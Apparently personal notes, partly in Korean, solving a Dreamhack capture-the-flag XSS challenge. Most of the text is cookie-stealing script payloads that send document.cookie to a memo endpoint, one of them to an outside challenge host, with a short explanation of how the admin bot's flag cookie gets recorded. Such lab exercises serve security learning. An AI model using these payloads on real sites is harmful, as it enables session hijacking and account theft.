<script>
new Image().src = “http://host1.dreamhack.games:8372/memo?memo=” + document.cookie;
</script>
>> wrong?? 

<script>
new Image().src = “http://127.0.0.1/memo?memo=” + document.cookie;
</script>
>>

최종적으로
<script>
new Image().src = “memo?memo=” + document.cookie;
</script>

<img src="/admin/notice_flag?userid=admin">

<img src="flag.txt">

{'name': 'flag', 'value': FLAG} 

read_url() 

<script>location.href="/memo?memo="+document.cookie;</script> 

 /flag 페이지의 'xss’에 
'<script>location.href="/memo?memo="+document.cookie;</script>'라고 입력하면
/xss 페이지에 'xss’값이 전달되고 실행되어 /memo 페이지에 잠깐 동안 존재했던 flag 쿠키가 기록
